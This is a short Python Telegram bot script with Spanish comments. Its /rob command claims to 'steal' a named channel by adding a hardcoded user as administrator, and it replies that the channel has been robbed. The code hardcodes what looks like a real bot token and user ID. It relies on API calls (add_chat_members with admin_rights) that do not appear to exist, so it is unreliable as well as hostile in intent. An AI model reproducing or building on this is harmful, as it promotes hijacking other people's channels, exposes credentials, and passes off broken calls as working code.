from telegram import Update, Bot
from telegram.ext import Updater, CommandHandler, CallbackContext
import logging

# Configura el logging
logging.basicConfig(
    format='%(asctime)s - %(name)s - %(levelname)s - %(message)s', level=logging.INFO
)
logger = logging.getLogger(__name__)

# Token de tu bot
TOKEN = "8579213873:AAFsNOtQGo1yb0Fx-T7F8_PQ29Mqm-37RO4"

# ID de usuario
USER_ID = 7086746844

# Función para agregar un usuario como administrador
def add_admin(bot: Bot, channel_username: str, user_id: int):
    bot.add_chat_members(channel_username, user_id, admin_rights=True)

# Manejador del comando /rob
def rob_channel(update: Update, context: CallbackContext) -> None:
    args = context.args
    if len(args) < 2:
        update.message.reply_text("Uso: /rob <nombre_de_usuario_del_canal> <url_del_canal>")
        return

    channel_username = args[0]
    channel_url = args[1]

    try:
        # Invita al bot al canal
        context.bot.add_chat_members(channel_username, USER_ID)

        # Agrega al usuario deseado como administrador
        add_admin(context.bot, channel_username, USER_ID)

        update.message.reply_text(f"¡He robado el canal {channel_username} y te he dado acceso como administrador!\nURL del canal: {channel_url}")
    except Exception as e:
        update.message.reply_text(f"Ocurrió un error: {e}")

# Función principal para iniciar el bot
def main() -> None:
    # Crea el Updater y pasa él token de tu bot
    updater = Updater(TOKEN)

    # Obtén el dispatcher para registrar los manejadores
    dispatcher = updater.dispatcher

    # Registra el manejador del comando /rob
    dispatcher.add_handler(CommandHandler("rob", rob_channel))

    # Inicia el bot
    updater.start_polling()

    # Ejecuta el bot hasta que se presione Ctrl-C o el proceso reciba SIGINT, SIGTERM o SIGABRT
    updater.idle()

if __name__ == '__main__':
    main()
